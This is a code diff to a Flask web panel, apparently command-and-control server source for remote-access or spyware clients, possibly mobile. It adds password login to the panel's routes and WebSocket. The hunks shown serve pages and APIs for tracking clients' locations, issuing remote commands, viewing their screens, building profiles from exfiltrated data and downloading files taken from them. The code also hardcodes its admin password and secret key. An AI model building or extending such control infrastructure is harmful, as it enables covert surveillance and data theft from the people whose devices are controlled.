@@ -1,14 +1,15 @@
 import eventlet
 eventlet.monkey_patch()  # THIS MUST BE THE FIRST LINE
 
-from flask import Flask, json, render_template, request, jsonify, send_file
-from flask_socketio import SocketIO, emit
+from flask import Flask, json, render_template, request, jsonify, send_file, session, redirect, url_for
+from flask_socketio import SocketIO, emit, disconnect
 import socket
 import threading
 import time
 import os
 import sys
 from datetime import datetime
+from functools import wraps
 
 # Global variables to manage C2 server state
 clients = {}  # {client_id: {'socket': socket_obj, 'addr': (ip, port), 'connected_at': timestamp}}
@@ -25,6 +26,18 @@ screen_stream_bindings = {}
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'c2-server-secret-key-change-in-production'
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
+
+# Change these credentials before deploying
+AUTH_USERNAME = 'admin'
+AUTH_PASSWORD = 'mobsec-c2server'
+
+def login_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if not session.get('authenticated'):
+            return redirect(url_for('login'))
+        return f(*args, **kwargs)
+    return decorated
 
 import struct
 import base64
@@ -495,27 +508,49 @@ def download_folder(client_id, folder_path, local_base_path=None):
     }
 
 
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if session.get('authenticated'):
+        return redirect(url_for('index'))
+    error = None
+    if request.method == 'POST':
+        if request.form.get('username') == AUTH_USERNAME and request.form.get('password') == AUTH_PASSWORD:
+            session['authenticated'] = True
+            return redirect(url_for('index'))
+        error = 'Invalid username or password'
+    return render_template('login.html', error=error)
+
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('login'))
+
 @app.route('/')
+@login_required
 def index():
     """Main web interface"""
     return render_template('index.html')
 
 @app.route('/history')
+@login_required
 def history():
     """Location history page"""
     return render_template('history.html')
 
 @app.route('/locations')
+@login_required
 def locations():
     """Client locations page"""
     return render_template('locations.html')
 
 @app.route('/console')
+@login_required
 def console():
     """Command console page"""
     return render_template('console.html')
 
 @app.route('/screenshare')
+@login_required
 def screenshare():
     """Screen share page"""
     return render_template('screenshare.html')
@@ -733,6 +768,7 @@ def parse_location_response(location_text):
 
 
 @app.route('/api/clients')
+@login_required
 def get_clients():
     """Get list of connected clients"""
     client_list = []
@@ -756,6 +792,7 @@ def get_clients():
     return jsonify({'clients': client_list})
 
 @app.route('/api/profiles')
+@login_required
 def get_profiles():
     """Aggregate user profiles from exfil logs for dashboard display."""
     if not os.path.exists(LOG_FILE):
@@ -823,6 +860,7 @@ def get_profiles():
     return jsonify({'profiles': profiles})
 
 @app.route('/api/locations')
+@login_required
 def get_locations():
     """Get all client locations for map display"""
     locations = []
@@ -837,6 +875,7 @@ def get_locations():
     return jsonify({'locations': locations})
 
 @app.route('/api/location_history')
+@login_required
 def get_location_history():
     """Get full location history from file"""
     history = []
@@ -851,6 +890,7 @@ def get_location_history():
     return jsonify({'history': history})
 
 @app.route('/api/server/status')
+@login_required
 def server_status():
     """Get server status"""
     return jsonify({
@@ -861,6 +901,7 @@ def server_status():
     })
 
 @app.route('/api/clients/cleanup', methods=['POST'])
+@login_required
 def cleanup_clients():
     """Manually trigger cleanup of stale clients"""
     removed = []
@@ -906,6 +947,9 @@ def cleanup_clients():
 @socketio.on('connect')
 def handle_connect():
     """Handle WebSocket connection"""
+    if not session.get('authenticated'):
+        disconnect()
+        return
     emit('server_status', {'status': 'running' if server_running else 'stopped'})
     # Send current clients
     for client_id, client_info in clients.items():
@@ -1039,6 +1083,7 @@ def handle_command(data):
     emit('command_response', {**result, 'client_id': client_id, 'command': command})
 
 @app.route('/api/downloads/<filename>')
+@login_required
 def download_file(filename):
     """Download a file from the downloads directory"""
     downloads_dir = os.path.join(os.path.dirname(__file__), 'downloads')
